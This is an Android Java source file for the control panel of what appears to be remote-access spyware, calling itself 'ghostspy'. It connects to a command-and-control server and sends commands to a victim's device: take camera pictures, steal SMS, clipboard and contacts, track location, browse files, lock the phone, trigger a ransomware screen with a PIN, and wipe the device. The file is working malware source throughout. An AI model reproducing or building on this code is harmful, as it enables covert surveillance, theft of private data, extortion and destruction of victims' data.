package com.testapp;

import android.app.Activity;
import android.app.AlertDialog;
import android.content.Intent;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.TextView;
import android.widget.Toast;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONObject;
import java.net.URISyntaxException;

public class FeaturesActivity extends Activity {
    private Socket socket;
    private String deviceId;
    private LinearLayout featureGrid;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_features);

        deviceId = getIntent().getStringExtra("deviceId");
        String deviceModel = getIntent().getStringExtra("deviceModel");
        ((TextView) findViewById(R.id.deviceInfo)).setText(deviceModel + " | IP: ...");

        featureGrid = findViewById(R.id.featureGrid);

        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
            socket.connect();
        } catch (URISyntaxException e) {}

        // Grid 3 kolom fitur
        String[][] features = {
            {"Kamera", "#FF1E5A", "start_camera"},
            {"Sms Baru", "#2ED8FF", "get_sms"},
            {"Clipboard", "#00E676", "get_clipboard"},
            {"Kontak", "#FFC107", "get_contacts"},
            {"Lokasi", "#FF4D8D", "get_location"},
            {"File Manager", "#9AA3B2", "list_files"},
            {"Lock", "#FF1E5A", "lock"},
            {"Unlock", "#00E676", "unlock"},
            {"Vibrate", "#AA00FF", "vibrate"},
            {"Toast", "#FFC107", "toast"},
            {"Ransomware", "#FF1E5A", "ransomware_activate"},
            {"Wipe", "#FF0000", "wipe"}
        };

        LinearLayout row = null;
        for (int i = 0; i < features.length; i++) {
            if (i % 3 == 0) {
                row = new LinearLayout(this);
                row.setOrientation(LinearLayout.HORIZONTAL);
                featureGrid.addView(row);
            }
            String[] f = features[i];
            TextView card = new TextView(this);
            card.setText(f[0]);
            card.setTextColor(0xFFFFFFFF);
            card.setBackgroundColor((int) Long.parseLong(f[1].substring(1), 16) | 0x22000000);
            card.setPadding(16, 24, 16, 24);
            card.setGravity(android.view.Gravity.CENTER);
            LinearLayout.LayoutParams p = new LinearLayout.LayoutParams(0, 120, 1);
            p.setMargins(6, 6, 6, 6);
            card.setLayoutParams(p);
            card.setOnClickListener(v -> handleFeature(f[2]));
            row.addView(card);
        }
    }

    private void handleFeature(String cmd) {
        switch (cmd) {
            case "toast": case "openurl": case "list_files":
                showInput(cmd, val -> sendCmd(cmd, new JSONObject() {{
                    try { put(cmd.equals("list_files") ? "path" : "text", val); } catch (Exception e) {}
                }}));
                break;
            case "ransomware_activate":
                showTwoInputs("HTML", "PIN", (html, pin) -> sendCmd(cmd, new JSONObject() {{
                    try { put("html", html); put("pin", pin); } catch (Exception e) {}
                }}));
                break;
            default:
                sendCmd(cmd, new JSONObject());
        }
    }

    private void sendCmd(String cmd, JSONObject params) {
        if (socket != null && socket.connected()) {
            JSONObject msg = new JSONObject();
            try {
                msg.put("device_id", deviceId);
                msg.put("command", cmd);
                msg.put("params", params);
                socket.emit("command", msg);
                Toast.makeText(this, "✅ " + cmd, Toast.LENGTH_SHORT).show();
            } catch (Exception e) {}
        } else {
            Toast.makeText(this, "❌ Offline", Toast.LENGTH_SHORT).show();
        }
    }

    private void showInput(String title, InputCallback cb) {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        b.setTitle(title);
        EditText e = new EditText(this);
        b.setView(e);
        b.setPositiveButton("OK", (d, w) -> cb.onInput(e.getText().toString()));
        b.setNegativeButton("Batal", null);
        b.show();
    }

    private void showTwoInputs(String t1, String t2, TwoInputCallback cb) {
        AlertDialog.Builder b = new AlertDialog.Builder(this);
        LinearLayout lay = new LinearLayout(this);
        lay.setOrientation(LinearLayout.VERTICAL);
        EditText e1 = new EditText(this); e1.setHint(t1);
        EditText e2 = new EditText(this); e2.setHint(t2);
        lay.addView(e1); lay.addView(e2);
        b.setView(lay);
        b.setPositiveButton("OK", (d, w) -> cb.onInput(e1.getText().toString(), e2.getText().toString()));
        b.setNegativeButton("Batal", null);
        b.show();
    }

    interface InputCallback { void onInput(String input); }
    interface TwoInputCallback { void onInput(String i1, String i2); }

    public void goBack(View v) { finish(); }
}
